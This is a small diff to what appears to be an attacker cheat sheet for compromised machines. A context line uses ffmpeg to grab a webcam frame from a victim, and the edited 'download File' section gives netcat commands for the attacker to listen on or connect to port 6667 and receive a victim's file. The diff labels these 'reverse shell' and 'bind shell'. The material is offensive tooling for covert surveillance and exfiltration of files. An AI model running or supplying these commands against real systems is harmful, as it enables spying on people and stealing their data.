@@ -41,8 +41,10 @@ ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -ss 0:0:1 -frames 1 /tmp/selfie
 ## download File
 Attacker:
 ```
+#reverse shell
 nc -lvp 6667 > sus_text.txt
-OR
+
+#bind shell
 nc <IP> 6667 > sus_text.txt
 ```
 Victim:
